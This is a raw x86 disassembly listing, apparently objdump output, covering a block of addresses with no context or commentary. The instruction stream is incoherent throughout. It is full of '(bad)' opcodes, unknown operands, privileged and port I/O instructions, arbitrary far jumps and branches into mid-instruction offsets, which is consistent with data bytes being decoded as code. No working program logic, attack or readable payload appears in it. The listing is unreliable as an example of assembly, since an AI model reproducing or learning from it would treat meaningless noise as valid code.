  41e6db:	xchg   edx,eax
  41e6dc:	aam    0x3
  41e6de:	push   ebx
  41e6df:	lods   eax,DWORD PTR ds:[esi]
  41e6e0:	loope  0x41e725
  41e6e2:	or     BYTE PTR [ebp+0x50],0x4
  41e6e6:	rcl    DWORD PTR [eax],cl
  41e6e8:	(bad)
  41e6eb:	fcmove st,st(2)
  41e6ed:	(bad)  
  41e6ef:	loopne 0x41e6eb
  41e6f1:	outs   dx,BYTE PTR ds:[esi]
  41e6f2:	jecxz  0x41e6e8
  41e6f4:	aas    
  41e6f5:	mov    ebx,0x9e009c6a
  41e6fa:	push   ebx
  41e6fb:	not    BYTE PTR [esi+0x194dd9c5]
  41e701:	mov    dh,0x28
  41e703:	ins    BYTE PTR es:[edi],dx
  41e704:	jmp    0x9be8b5a
  41e709:	adc    BYTE PTR [edi],bl
  41e70b:	enter  0xd568,0xef
  41e70f:	mov    ah,0xb3
  41e711:	imul   esi,edx,0xffffffe3
  41e714:	retf   
  41e715:	dec    ecx
  41e716:	in     al,0xdd
  41e718:	mov    al,0x9d
  41e71a:	mov    ?,WORD PTR [edx+ebx*4+0x45]
  41e71e:	arpl   cx,ax
  41e720:	fst    st(6)
  41e722:	lock jle 0x41e708
  41e725:	push   0xffffff99
  41e727:	je     0x41e711
  41e729:	aaa    
  41e72a:	cmp    DWORD PTR ds:0x4fc56f03,esp
  41e730:	jbe    0x41e6ea
  41e732:	popf   
  41e733:	rcr    edi,cl
  41e735:	inc    ecx
  41e736:	ret    
  41e737:	add    BYTE PTR [ebx-0x1],ch
  41e73a:	inc    edx
  41e73b:	jmp    0x41e7b3
  41e73d:	fld    QWORD PTR ds:[eax-0x4e5d8d1]
  41e744:	jnp    0x41e778
  41e746:	out    dx,al
  41e747:	(bad)  
  41e748:	mov    eax,DWORD PTR [esi+0x6c]
  41e74b:	fmul   QWORD PTR [esi+0x17]
  41e74e:	xchg   edx,eax
  41e74f:	push   ebx
  41e750:	sub    cl,ah
  41e752:	push   eax
  41e753:	cld    
  41e754:	ror    BYTE PTR [esi-0x2675bba5],0x6a
  41e75b:	inc    ebp
  41e75c:	fadd   DWORD PTR [ecx]
  41e75e:	xchg   ecx,eax
  41e75f:	pop    ds
  41e760:	sahf   
  41e761:	cmp    DWORD PTR [esi+ebp*1-0x40],0x6869aa44
  41e769:	mov    ch,BYTE PTR [eax+eiz*4+0x61]
  41e76d:	sahf   
  41e76e:	shl    DWORD PTR [edx],1
  41e770:	call   FWORD PTR [ecx+ebp*1]
  41e773:	adc    eax,esp
  41e775:	imul   esi,DWORD PTR ds:0x41cefd5f,0x157dac1f
  41e77f:	add    DWORD PTR [ebp+ecx*2+0x45c0be34],edx
  41e786:	mov    ecx,0x3d9c3a36
  41e78b:	arpl   ax,bx
  41e78d:	add    BYTE PTR [esp+eiz*2-0x4b],bl
  41e791:	jae    0x41e76d
  41e793:	pusha  
  41e794:	inc    esp
  41e795:	pop    edi
  41e796:	addr16 cwde 
  41e798:	shl    ah,1
  41e79a:	rcr    esi,cl
  41e79c:	mov    dl,0x50
  41e79e:	lds    ecx,FWORD PTR [ebp+0x27ff7200]
  41e7a4:	mov    WORD PTR [esi+0x2ef509b5],?
  41e7aa:	ins    BYTE PTR es:[edi],dx
  41e7ab:	je     0x41e7b8
  41e7ad:	fmul   QWORD PTR [esi]
  41e7af:	jmp    0x438b:0xd8caffed
  41e7b6:	(bad)  
  41e7b7:	pop    edi
  41e7b8:	(bad)  
  41e7b9:	hlt    
  41e7ba:	xchg   edx,eax
  41e7bb:	dec    edx
  41e7bc:	jp     0x41e755
  41e7be:	(bad)  
  41e7bf:	jns    0x41e771
  41e7c1:	jns    0x41e749
  41e7c3:	outs   dx,DWORD PTR ds:[esi]
  41e7c4:	aas    
  41e7c5:	or     edx,DWORD PTR [edx+0x52]
  41e7c8:	js     0x41e7d9
  41e7ca:	cmp    DWORD PTR [ecx+ebp*1+0x58991353],ebp
  41e7d1:	(bad)  
  41e7d2:	xchg   esi,eax
  41e7d3:	add    BYTE PTR ds:0xc2f6634c,dl
  41e7d9:	add    dh,BYTE PTR [ebx-0x34]
  41e7dc:	test   BYTE PTR cs:[edx+0xe],bh
  41e7e0:	mov    ch,0x98
  41e7e2:	push   ds
  41e7e3:	lea    ecx,[eax-0x62]
  41e7e6:	iret   
  41e7e7:	scas   eax,DWORD PTR es:[edi]
  41e7e8:	mov    ch,0x83
  41e7ea:	rcr    bl,1
  41e7ec:	repnz out dx,al
  41e7ee:	mov    al,0xc2
  41e7f0:	inc    ebp
  41e7f1:	mov    edx,0xa63778de
  41e7f6:	(bad)  
  41e7f7:	adc    eax,DWORD PTR [ebp-0x675a80fe]
  41e7fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e7fe:	add    eax,0xe4f799b
  41e803:	sub    BYTE PTR [eax],0xdf
  41e806:	adc    eax,0xebe73d9b
  41e80b:	out    0x15,eax
  41e80d:	jns    0x41e7f3
  41e80f:	into   
  41e810:	mov    al,0xf
  41e812:	and    eax,0x125c04f7
  41e817:	sub    BYTE PTR [bx+0x2115],dh
  41e81c:	test   al,0xa8
  41e81e:	jecxz  0x41e878
  41e820:	sbb    DWORD PTR [ecx-0x2652247f],0x951411c4
  41e82a:	jne    0x41e810
  41e82c:	in     al,dx
  41e82d:	daa    
  41e82e:	sbb    eax,0x596b6a4d
  41e833:	std    
  41e834:	test   al,0x61
  41e836:	mov    ecx,0xd7ebd7fe
  41e83b:	cld    
  41e83c:	mov    BYTE PTR [eax-0x796cb6fa],ch
  41e842:	cmp    ecx,DWORD PTR [ebp+0x16c5424e]
  41e848:	xchg   edx,eax
  41e849:	dec    edi
  41e84a:	sub    ah,0x64
  41e84d:	fs call 0x355c:0xf11f5bc2
  41e855:	test   edi,esp
  41e857:	(bad)  
  41e858:	not    DWORD PTR [esi]
  41e85a:	into   
  41e85b:	dec    esi
  41e85c:	(bad)  [edx-0x1]
  41e85f:	clc    
  41e860:	push   0x5e7ffada
  41e865:	fisub  WORD PTR [ecx]
  41e867:	je     0x41e883
  41e869:	and    BYTE PTR [ecx],dl
  41e86b:	int    0xae
  41e86d:	ss push ebx
  41e86f:	jae    0x41e8b4
  41e871:	cli    
  41e872:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e873:	cmp    eax,edi
  41e875:	sub    DWORD PTR [ebx-0x4f],0x550137c3
  41e87c:	addr16 sub eax,0x75844fcc
  41e882:	add    ecx,DWORD PTR [ebx]
  41e884:	sub    DWORD PTR [ecx],0xffffffa9
  41e887:	xchg   dh,bl
  41e889:	push   ebx
  41e88a:	inc    ebx
  41e88b:	mov    al,ds:0x7c4c4420
  41e890:	push   eax
  41e891:	mov    ah,0xbd
  41e893:	ss pop ecx
  41e895:	push   0x5571548
  41e89a:	jno    0x41e91a
  41e89c:	xor    eax,0x4b75e8f7
  41e8a1:	jmp    0x41e8b7
  41e8a3:	add    eax,0x9380218c
  41e8a8:	(bad)  [edx-0x37]
  41e8ab:	inc    ebx
  41e8ac:	pusha  
  41e8ad:	int3   
  41e8ae:	aam    0x2b
  41e8b0:	push   0x76
  41e8b2:	stos   DWORD PTR es:[edi],eax
  41e8b3:	and    al,0xe6
  41e8b5:	scas   al,BYTE PTR es:[edi]
  41e8b6:	rcl    DWORD PTR [edi+ebx*1-0x51],0x48
  41e8bb:	cmp    bh,cl
  41e8bd:	jp     0x41e85b
  41e8bf:	sub    BYTE PTR [ebx],dl
  41e8c1:	adc    BYTE PTR [ecx],0xf3
  41e8c4:	inc    eax
  41e8c5:	xchg   edi,eax
  41e8c6:	mov    eax,0x3ef204ff
  41e8cb:	xlat   BYTE PTR ds:[ebx]
  41e8cc:	xor    esp,edi
  41e8ce:	adc    eax,0x1b4afd77
  41e8d3:	test   eax,0x2e288643
  41e8d8:	inc    ebp
  41e8d9:	push   eax
  41e8da:	popf   
  41e8db:	or     ch,ch
  41e8dd:	scas   al,BYTE PTR es:[edi]
  41e8de:	scas   al,BYTE PTR es:[edi]
  41e8df:	jnp    0x41e867
  41e8e1:	mov    ds:0x72309a2a,al
  41e8e6:	pop    es
  41e8e7:	int3   
  41e8e8:	add    cl,al
  41e8ea:	les    esp,FWORD PTR [ebx]
  41e8ec:	stc    
  41e8ed:	cli    
  41e8ee:	and    al,0x44
  41e8f0:	or     dl,BYTE PTR [esp+esi*8+0x60477539]
  41e8f7:	jl     0x41e8a5
  41e8f9:	sar    bl,0x81
  41e8fc:	jo     0xb5644bc5
  41e902:	dec    eax
  41e903:	into   
  41e904:	in     al,dx
  41e905:	add    al,0x64
  41e907:	out    0xff,eax
  41e909:	push   si
  41e90b:	jbe    0x41e8ab
  41e90d:	sub    al,0x5e
  41e90f:	mov    bh,0xb9
  41e911:	ja     0x41e970
  41e913:	out    dx,eax
  41e914:	fstp   st(2)
  41e916:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e917:	sahf   
  41e918:	in     al,dx
  41e919:	and    BYTE PTR [ebp-0x6d8af1c5],ch
  41e91f:	fisubr WORD PTR [edx]
  41e921:	pop    esi
  41e922:	out    dx,al
  41e923:	mov    eax,0x2bbcd116
  41e928:	push   ss
  41e929:	xor    cl,cl
  41e92b:	outs   dx,BYTE PTR ds:[esi]
  41e92c:	std    
  41e92d:	pop    eax
  41e92e:	xchg   edx,eax
  41e92f:	mov    cl,0xaf
  41e931:	or     bh,ch
  41e933:	jge    0x41e907
  41e935:	mov    ds:0x7906ae75,al
  41e93a:	popa   
  41e93b:	gs jge 0x41e930
  41e93e:	bnd jno 0x41e8da
  41e941:	pusha  
  41e942:	enter  0xfb43,0x6b
  41e946:	pop    esi
  41e947:	repnz adc dh,BYTE PTR [edi+0x36cd1ac2]
  41e94e:	jecxz  0x41e8d1
  41e950:	(bad)  [eax]
  41e952:	mov    esp,DWORD PTR [eax-0x20]
  41e955:	das    
  41e956:	ds sar eax,1
  41e959:	cmp    esi,DWORD PTR [ebx-0x2ea6da99]
  41e95f:	and    eax,0xc34e8fa6
  41e964:	and    BYTE PTR [edi+0xf],bh
  41e967:	xor    eax,0x22d552f8
  41e96c:	mov    fs,WORD PTR [eax-0x4c]
  41e96f:	cmp    DWORD PTR [esi+0x52b07b01],ebp
  41e975:	repz test BYTE PTR [ebx+0x9fdbe1b],ah
  41e97c:	ss xchg ecx,eax
  41e97e:	and    al,0x9a
  41e980:	push   ebx
  41e981:	arpl   WORD PTR [ecx-0x7ef1d178],di
  41e987:	hlt    
  41e988:	stc    
  41e989:	pop    ecx
  41e98a:	loopne 0x41e98f
  41e98c:	xchg   edi,eax
  41e98d:	dec    edi
  41e98e:	stc    
  41e98f:	push   eax
  41e990:	clc    
  41e991:	pop    edi
  41e992:	cmovge esi,DWORD PTR [ecx]
  41e995:	jo     0x41e9f3
  41e997:	mov    eax,ds:0x28f379a0
  41e99c:	inc    esi
  41e99d:	ins    BYTE PTR es:[edi],dx
  41e99e:	pop    ebx
  41e99f:	dec    ecx
  41e9a0:	hlt    
  41e9a1:	dec    eax
  41e9a2:	(bad)  
  41e9a3:	hlt    
  41e9a4:	(bad)
  41e9a7:	push   0x6c
  41e9a9:	sbb    eax,0x1e852c3e
  41e9ae:	popf   
  41e9af:	out    0x28,eax
  41e9b1:	scas   eax,DWORD PTR es:[edi]
  41e9b2:	js     0x41e9ae
  41e9b4:	dec    esi
  41e9b5:	or     BYTE PTR [ecx-0x221ce4e],bh
  41e9bb:	mov    dl,0x41
  41e9bd:	sub    BYTE PTR [ecx],ch
  41e9bf:	cmp    eax,0x4ed01544
  41e9c4:	repnz dec eax
  41e9c6:	xor    eax,0xac180d75
  41e9cb:	cmp    dh,BYTE PTR gs:[edx-0x139164db]
  41e9d2:	mov    ds:0xcc092ca6,al
  41e9d7:	sbb    al,0x4c
  41e9d9:	sbb    BYTE PTR [ebp-0x41],bh
  41e9dc:	mov    ds:0x57ebef0b,al
  41e9e1:	jnp    0x41e9dd
  41e9e3:	pop    esi
  41e9e4:	lock into 
  41e9e6:	sbb    eax,0xc9061407
  41e9eb:	pop    es
  41e9ec:	aad    0x6e
  41e9ee:	mov    ds:0x2d5da405,al
  41e9f3:	pop    edi
  41e9f4:	and    ebx,DWORD PTR [ebx-0x36]
  41e9f7:	iret   
  41e9f8:	in     al,0x53
  41e9fa:	mov    ch,0xa0
  41e9fc:	pop    esp
  41e9fd:	xor    eax,0x5e9682a1
  41ea02:	pushf  
  41ea03:	ror    BYTE PTR [ecx-0x66de0be8],1
  41ea09:	jnp    0x41e9dd
  41ea0b:	enter  0x33e1,0xba
  41ea0f:	scas   al,BYTE PTR es:[edi]
  41ea10:	sbb    BYTE PTR [esi],0x9f
  41ea13:	jbe    0x41e9c7
  41ea15:	xchg   esp,eax
  41ea16:	lock mov BYTE PTR [ecx-0x70],ah
  41ea1a:	ss shr esp,1
  41ea1d:	pop    esi
  41ea1e:	push   esi
  41ea1f:	aaa    
  41ea20:	(bad)  
  41ea21:	adc    eax,0xcc61f868
  41ea26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea27:	shufps xmm7,XMMWORD PTR [ebx-0x80],0x5f
  41ea2c:	mov    ds:0x5395b67d,eax
  41ea31:	push   cs
  41ea32:	dec    edi
  41ea33:	sub    esi,ebx
  41ea35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea36:	push   esp
  41ea37:	je     0x41ea03
  41ea39:	sbb    BYTE PTR [esi+0x150454da],ah
  41ea3f:	dec    edx
  41ea40:	scas   al,BYTE PTR es:[edi]
  41ea41:	pop    esi
  41ea42:	adc    ah,BYTE PTR ds:[eax]
  41ea45:	and    al,ah
  41ea47:	sbb    al,0x3b
  41ea49:	imul   esi,DWORD PTR [esi-0x2a],0x20
  41ea4d:	sbb    eax,0x8fba3aa5
  41ea52:	mov    edx,0xe9b5aed9
  41ea57:	xchg   ebx,eax
  41ea58:	ins    BYTE PTR es:[edi],dx
  41ea59:	ins    BYTE PTR es:[edi],dx
  41ea5a:	xchg   DWORD PTR [eax+ebx*8+0x4a5c0ad8],esi
  41ea61:	in     eax,0xd4
  41ea63:	js     0x41ea15
  41ea65:	pop    esp
  41ea66:	sahf   
  41ea67:	aam    0x76
  41ea69:	aas    
  41ea6a:	loopne 0x41ea36
  41ea6c:	jl     0x41ea92
  41ea6e:	ficom  WORD PTR [ebx]
  41ea70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea71:	push   eax
  41ea72:	pop    es
  41ea73:	cmp    al,0x1e
  41ea75:	sbb    edi,esi
  41ea77:	idiv   BYTE PTR [ebp-0x19]
  41ea7a:	fld    QWORD PTR [eax]
  41ea7c:	imul   ecx,DWORD PTR [eax],0xffffffd2
  41ea7f:	push   ecx
  41ea80:	mov    esp,0x48b71ee9
  41ea85:	pop    esi
  41ea86:	add    bh,al
  41ea88:	pop    ss
  41ea89:	ja     0x41ea68
  41ea8b:	jle    0x41eb03
  41ea8d:	bound  ebx,QWORD PTR ss:[edx+0x9]
  41ea91:	mov    ecx,DWORD PTR [edi+0x39d8da9b]
  41ea97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea98:	or     eax,0x1df132b4
  41ea9d:	aad    0x97
  41ea9f:	jl     0x41ea40
  41eaa1:	rol    ch,0x1f
  41eaa4:	or     ah,ah
  41eaa6:	dec    ebp
  41eaa7:	sbb    esi,edx
  41eaa9:	imul   esp,edi,0xffffff81
  41eaac:	inc    ebx
  41eaad:	daa    
  41eaae:	sbb    al,0xf7
  41eab0:	jl     0x41eaba
  41eab2:	loop   0x41eaed
  41eab4:	cmp    DWORD PTR ds:[ebx+ebx*1-0x6839aeab],0xfffffffb
  41eabd:	stos   DWORD PTR es:[edi],eax
  41eabe:	sub    BYTE PTR [edi+0x3513ba8e],ch
  41eac4:	mov    esp,?
  41eac6:	jb     0x41eaf7
  41eac8:	xor    BYTE PTR [edx-0x13e06370],ah
  41eace:	mov    edx,0x650dc1db
  41ead3:	sar    DWORD PTR [ecx],0x5b
  41ead6:	shl    ch,cl
  41ead8:	xchg   esi,eax
  41ead9:	ss out 0x2a,eax
  41eadc:	dec    ebx
  41eadd:	and    DWORD PTR [ebp+0x2dfa01],0xfffffff7
  41eae4:	cmp    eax,0xa9b7d267
  41eae9:	sbb    DWORD PTR [edx],ecx
  41eaeb:	or     BYTE PTR [esi+0x6cf8d240],ch
  41eaf1:	hlt    
  41eaf2:	lock pop ecx
  41eaf4:	call   0xb44f:0xb6d220d7
  41eafb:	call   0xae93fed9
  41eb00:	(bad)  
  41eb02:	aaa    
  41eb03:	loopne 0x41eadb
  41eb05:	cwde   
  41eb06:	repnz fstp QWORD PTR [edx+0x63]
  41eb0a:	fadd   DWORD PTR [esi-0x73]
  41eb0d:	sub    BYTE PTR [edx+0x6c9c312],dh
  41eb13:	retf   0x27a4
  41eb16:	or     DWORD PTR [edi+ebp*1-0x41],eax
  41eb1a:	movntq QWORD PTR [esp+eiz*8],mm0
  41eb1e:	nop
  41eb1f:	test   DWORD PTR [edi],ebx
  41eb21:	and    al,0x22
  41eb23:	push   0x448a97f
  41eb28:	sbb    esp,0xde44321e
  41eb2e:	xchg   edi,ebx
  41eb30:	add    al,0x21
  41eb32:	jl     0x41eae7
  41eb34:	fsub   DWORD PTR [ebp-0x26]
  41eb37:	jae    0x41eb30
  41eb39:	mov    eax,ds:0xfdfe3065
  41eb3e:	push   eax
  41eb3f:	dec    eax
  41eb40:	push   0xffffffc1
  41eb42:	mov    esi,0x72095e25
  41eb47:	jns    0x41eb74
  41eb49:	and    eax,0xe3790d83
  41eb4e:	dec    ecx
  41eb4f:	cmp    bh,dl
  41eb51:	std    
  41eb52:	xor    al,cl
  41eb54:	mov    ebx,0xdee64798
  41eb59:	or     dh,BYTE PTR [eax-0x45]
  41eb5c:	int    0xce
  41eb5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eb5f:	out    0x6f,al
  41eb61:	or     ah,0xaa
  41eb64:	shl    BYTE PTR [edx+0x7673b335],0x42
  41eb6b:	jae    0x41eb14
  41eb6d:	into   
  41eb6e:	add    BYTE PTR [edi-0x5],ah
  41eb71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eb72:	fnstsw WORD PTR [ecx]
  41eb74:	inc    ebx
  41eb75:	mov    ?,WORD PTR [ebx+0xe5d577b]
  41eb7b:	rdmsr  
  41eb7d:	ret    0xbcb1
  41eb80:	sub    al,BYTE PTR [edi]
  41eb82:	clc    
  41eb83:	xor    edi,edx
  41eb85:	sahf   
  41eb86:	jo     0x41ebe0
  41eb88:	jno    0x41ebf3
  41eb8a:	mov    DWORD PTR [edi-0x15433430],0xe4a365c1
  41eb94:	sub    eax,0xd576dab0
  41eb99:	cdq    
  41eb9a:	jmp    0x41eb2f
  41eb9c:	xor    al,0xbe
  41eb9e:	in     eax,dx
  41eb9f:	push   ecx
  41eba0:	jp     0x41eba8
  41eba2:	dec    ecx
  41eba3:	sti    
  41eba4:	cld    
  41eba5:	or     bl,bh
  41eba7:	aaa    
  41eba8:	mov    esp,0x1747d59f
  41ebad:	xor    DWORD PTR [bx+di+0x55],ecx
  41ebb1:	push   ss
  41ebb2:	cld    
  41ebb3:	popf   
  41ebb4:	dec    esi
  41ebb5:	pop    esi
  41ebb6:	dec    edx
  41ebb7:	loope  0x41ec19
  41ebb9:	jmp    0x3d60:0x65dca246
  41ebc0:	fst    DWORD PTR [edi-0x7331de54]
  41ebc6:	dec    eax
  41ebc7:	xor    eax,0x6f95b5f7
  41ebcc:	jp     0x41ebf8
  41ebce:	cs xor esi,edi
  41ebd1:	aaa    
  41ebd2:	or     ecx,esp
  41ebd4:	adc    eax,0xe51b757a
  41ebd9:	(bad)  
  41ebda:	(bad)  
  41ebdc:	jbe    0x41ec19
  41ebde:	dec    edx
  41ebdf:	(bad)  
  41ebe0:	push   ecx
  41ebe1:	or     dh,dh
  41ebe3:	xchg   esp,eax
  41ebe4:	add    eax,0x3d8273b6
  41ebe9:	rcl    DWORD PTR [ebp+edx*4-0x60],cl
  41ebed:	fcmovnb st,st(0)
  41ebef:	mov    ah,0xf9
  41ebf1:	(bad)  
  41ebf2:	push   esp
  41ebf3:	imul   BYTE PTR [ecx]
  41ebf5:	jecxz  0x41ec25
  41ebf7:	mov    eax,0xd2644767
  41ebfc:	xchg   edi,eax
  41ebfd:	dec    edx
  41ebfe:	or     al,0x8a
  41ec00:	shr    BYTE PTR [edi+edi*8-0x1a],0x65
  41ec05:	jo     0x41ec54
  41ec07:	popf   
  41ec08:	adc    DWORD PTR [eax-0x229f2bd4],ebx
  41ec0e:	fdivr  QWORD PTR [esi-0x76]
  41ec11:	mov    eax,0xb9414abb
  41ec16:	retf   0x16a6
  41ec19:	dec    edi
  41ec1a:	out    0x1b,eax
  41ec1c:	and    al,BYTE PTR [edi+ebp*2-0x3a]
  41ec20:	sub    BYTE PTR [ebx-0x14],dh
  41ec23:	jmp    DWORD PTR [ebx]
  41ec25:	inc    DWORD PTR [esi-0x5048744f]
  41ec2b:	cmp    al,0xd
  41ec2d:	push   ecx
  41ec2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec2f:	adc    al,0x95
  41ec31:	hlt    
  41ec32:	scas   al,BYTE PTR es:[edi]
  41ec33:	test   DWORD PTR [ecx],edi
  41ec35:	jns    0x41ec6e
  41ec37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec38:	mov    ch,0xd5
  41ec3a:	cwde   
  41ec3b:	mov    ch,0x11
  41ec3d:	and    edx,edi
  41ec3f:	mov    bl,0x83
  41ec41:	mov    eax,0xf626ed28
  41ec46:	xor    al,0xbb
  41ec48:	push   ecx
  41ec49:	cmp    esi,DWORD PTR [esp+esi*1-0x69]
  41ec4d:	dec    eax
  41ec4e:	lock call 0x1dd239b6
  41ec54:	jle    0x41ecbf
  41ec56:	ret    0xd0e3
  41ec59:	xchg   edx,eax
  41ec5a:	push   esp
  41ec5b:	mov    ecx,0xfbad966c
  41ec60:	jmp    0xc5c8:0xe1b4ca0
  41ec67:	sbb    eax,0xc9e98238
  41ec6c:	dec    ecx
  41ec6d:	pop    eax
  41ec6e:	sbb    ebp,ebx
  41ec70:	and    al,0x15
  41ec72:	jnp    0x41ec31
  41ec74:	dec    eax
  41ec75:	pop    ecx
  41ec76:	dec    eax
  41ec78:	fucom  st(1)
  41ec7a:	inc    ebp
  41ec7b:	jae    0x41ec1c
  41ec7d:	call   0x1a32:0x24f5f036
  41ec84:	lods   al,BYTE PTR ds:[esi]
  41ec85:	ins    BYTE PTR es:[edi],dx
  41ec86:	or     al,BYTE PTR [ebx+eiz*8-0x6a]
  41ec8a:	or     bl,dh
  41ec8c:	xchg   edi,eax
  41ec8d:	jp     0x41ecb9
  41ec8f:	int3   
  41ec90:	fs jne 0x41ec4b
  41ec93:	jno    0x41ec88
  41ec95:	iret   
  41ec96:	fbstp  TBYTE PTR [ebx-0x69]
  41ec99:	inc    esp
  41ec9a:	xor    DWORD PTR [esi+0x66],ecx
  41ec9d:	adc    cl,BYTE PTR [eax+0x50174797]
  41eca3:	sbb    al,0xa0
  41eca5:	(bad)  
  41eca6:	mov    WORD PTR [edi+0x18d5f2be],es
  41ecac:	daa    
  41ecad:	push   0xf9abc221
  41ecb2:	ja     0x41ecf5
  41ecb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ecb5:	inc    ecx
  41ecb6:	mov    ss,WORD PTR [ebp+0x565038cd]
  41ecbc:	add    eax,0xa251ee64
  41ecc1:	rol    DWORD PTR [edi+0x7eb6ff65],1
  41ecc7:	imul   edx,DWORD PTR [esi-0x3d],0x5b
  41eccb:	and    edx,esi
  41eccd:	es push 0x42
  41ecd0:	stos   DWORD PTR es:[edi],eax
  41ecd1:	js     0x41ed21
  41ecd3:	cld    
  41ecd4:	jb     0x41ecc1
  41ecd6:	inc    esi
  41ecd7:	mov    ds:0x1b3b2660,al
  41ecdc:	and    al,0x52
  41ecde:	(bad)  
  41ecdf:	std    
  41ece0:	cmp    DWORD PTR [edi-0x6424928c],edx
  41ece6:	loopne 0x41ec96
  41ece8:	mov    bl,0x1d
  41ecea:	dec    ecx
  41eceb:	pop    es
  41ecec:	mov    eax,ds:0x1f540f69
  41ecf1:	xchg   edi,eax
  41ecf2:	mov    ebp,esi
  41ecf4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ecf5:	mov    ah,0x3d
  41ecf7:	int    0x9f
  41ecf9:	adc    al,0x6d
  41ecfb:	jg     0x41ec9e
  41ecfd:	loop   0x41ed0b
  41ecff:	jae    0x41ec99
  41ed01:	lds    esp,FWORD PTR [eax]
  41ed03:	iret   
  41ed04:	jmp    0xd1f4853b
  41ed09:	xchg   ebp,eax
  41ed0a:	push   ebp
  41ed0b:	jnp    0x41ed89
  41ed0d:	rcr    DWORD PTR [edx+eax*1-0x1e1a1c5f],1
  41ed14:	inc    edx
  41ed15:	adc    dl,BYTE PTR [ecx]
  41ed17:	fild   DWORD PTR [ebp+0x55]
  41ed1a:	and    eax,DWORD PTR [ebx+ebp*4+0x786c07b3]
  41ed21:	sbb    BYTE PTR [eax-0x2],0xf8
  41ed25:	cwde   
  41ed26:	or     ecx,DWORD PTR [ecx+0x3553aec4]
  41ed2c:	outs   dx,BYTE PTR ds:[esi]
  41ed2d:	in     al,0x82
  41ed2f:	fsub   st,st(2)
  41ed31:	add    al,0x62
  41ed33:	test   eax,0x3b386d98
  41ed38:	cdq    
  41ed39:	mov    eax,ds:0xdbad6a70
  41ed3e:	inc    esi
  41ed3f:	or     eax,0x56d8d8ab
  41ed44:	push   cs
  41ed45:	cmc    
  41ed46:	sbb    eax,0xc5639e75
  41ed4b:	and    BYTE PTR ds:0xec490d06,al
  41ed51:	ins    DWORD PTR es:[edi],dx
  41ed52:	push   es
  41ed53:	push   eax
  41ed54:	or     al,0x4b
  41ed56:	sti    
  41ed57:	or     BYTE PTR [edi],ch
  41ed59:	out    dx,al
  41ed5a:	xor    al,0x84
  41ed5c:	add    ah,BYTE PTR [edx-0xcdb83da]
  41ed62:	shl    BYTE PTR [ebp-0x51a74009],cl
  41ed68:	int3   
  41ed69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ed6a:	xchg   ecx,eax
  41ed6b:	int3   
  41ed6c:	inc    edi
  41ed6d:	lds    esp,FWORD PTR [ecx-0xe]
  41ed70:	pop    ebp
  41ed71:	fs out 0xff,al
  41ed74:	sahf   
  41ed75:	or     ah,BYTE PTR [edi]
  41ed77:	mov    DWORD PTR [eax-0x7a],ebp
  41ed7a:	sub    esp,ecx
  41ed7c:	fstp   DWORD PTR [eax*4-0x4ef2227c]
  41ed83:	ins    BYTE PTR es:[edi],dx
  41ed84:	les    esp,FWORD PTR [edx+ecx*1-0x67c684ca]
  41ed8b:	les    esp,FWORD PTR [esi]
  41ed8d:	clc    
  41ed8e:	lock pop esp
  41ed90:	or     BYTE PTR [esi+0x4901d3bd],dh
  41ed96:	push   ds
  41ed97:	ret    0x8c03
  41ed9a:	das    
  41ed9b:	fist   DWORD PTR ds:0x19478c4b
  41eda1:	dec    edi
  41eda2:	nop    DWORD PTR [ecx]
  41eda5:	ss popf 
  41eda7:	hlt    
  41eda8:	rol    DWORD PTR [ebx+0x1841c679],0xc1
  41edaf:	adc    esi,0xffffffca
  41edb2:	jg     0x41ede2
  41edb4:	jmp    0x41edd0
  41edb6:	aas    
  41edb7:	cld    
  41edb8:	add    esi,DWORD PTR [edi]
  41edba:	mov    dh,0x82
  41edbc:	add    al,0xa1
  41edbe:	jbe    0x41ee3d
  41edc0:	aas    
  41edc1:	(bad)  
  41edc2:	clc    
  41edc3:	ror    BYTE PTR ds:0xbafe3f43,cl
  41edc9:	sbb    esp,DWORD PTR [edx]
  41edcb:	inc    esi
  41edcc:	adc    esp,eax
  41edce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41edcf:	sbb    edx,DWORD PTR [esi+0x25945273]
  41edd5:	out    0xf9,eax
  41edd7:	push   0x32
  41edd9:	dec    edx
  41edda:	scas   al,BYTE PTR es:[edi]
  41eddb:	imul   esp,DWORD PTR [ebx],0xffffffc0
  41edde:	fisub  WORD PTR [ecx-0x2e]
  41ede1:	outs   dx,BYTE PTR ds:[esi]
  41ede2:	mov    bh,0x94
  41ede4:	add    eax,0xa74a2ebf
  41ede9:	mov    dh,0xcc
  41edeb:	pop    es
  41edec:	xor    bh,dl
  41edee:	cld    
  41edef:	pop    ebx
  41edf1:	sub    eax,0x656fcfd9
  41edf6:	je     0x41edd5
  41edf8:	in     al,dx
  41edf9:	cdq    
  41edfa:	cli    
  41edfb:	shl    DWORD PTR [edx],cl
  41edfd:	cmp    DWORD PTR [eax],0xcf638e90
  41ee03:	popa   
  41ee04:	xchg   esi,eax
  41ee05:	jnp    0x41edcb
  41ee07:	adc    BYTE PTR [ebp-0x14],bh
  41ee0a:	xor    eax,0xb4548b5d
  41ee0f:	push   esp
  41ee10:	xchg   DWORD PTR [ecx],esi
  41ee12:	xor    esp,edx
  41ee14:	fs xchg esi,eax
  41ee16:	arpl   WORD PTR [edx-0x12],bp
  41ee19:	mov    ds:0xee4b5a49,al
  41ee1e:	int3   
  41ee1f:	cld    
  41ee20:	xchg   edx,eax
  41ee21:	or     ecx,edi
  41ee23:	retf   
  41ee24:	fiadd  DWORD PTR [eax+0xa3f66fa]
  41ee2a:	jg     0x41ee53
  41ee2c:	je     0x41eddb
  41ee2e:	cmp    edx,ebx
  41ee30:	mov    ah,0xd9
  41ee32:	xor    ebp,DWORD PTR [edi+0x2680b209]
  41ee38:	lods   eax,DWORD PTR ds:[esi]
  41ee39:	inc    esp
